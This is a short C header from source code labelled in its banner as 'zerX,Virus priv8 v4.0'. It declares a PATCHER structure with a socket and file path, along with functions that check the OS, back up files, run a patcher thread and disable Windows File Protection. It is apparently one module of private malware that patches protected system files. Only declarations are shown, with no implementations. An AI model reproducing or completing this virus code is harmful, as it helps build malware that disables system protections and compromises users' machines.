/*     
///////////////////////////////////////////////////////        
													 ./
 XXXXXXX   XXXXXXX XXXXXXXXXX   XXXXXXXX  XXXXXXXX   ./
  	XXXX   XXXX    XXXX   XXX      XXXXX  XXXXX      ./
	 XXXX XXXX     XXXX  XXXX       XXXX  XXXX       ./
	  XXXXXXX	   XXXXXXXXX         XXXXXXXX        ./
	   XXXXX       XXXX   XXX       XXXX XXXXX       ./
        XXX        XXXX   XXXX     XXXXX  XXXXX      ./
         X         XXXX   XXXXX XXXXXXXX  XXXXXXXX   ./
............................zerX,Virus priv8......v4.0/
///////////////////////////////////////////////////////

*/
typedef struct PATCHER
{
	SOCKET sock;
	int threadnum;
	char path[MAX_PATH];
	int version;
	BOOL notice;
	BOOL gotinfo;

} PATCHER;


BOOL checkos();
BOOL backup(char szPath[MAX_PATH]);
void Disable_WFP(char *szFile);
DWORD WINAPI PatcherThread(LPVOID param);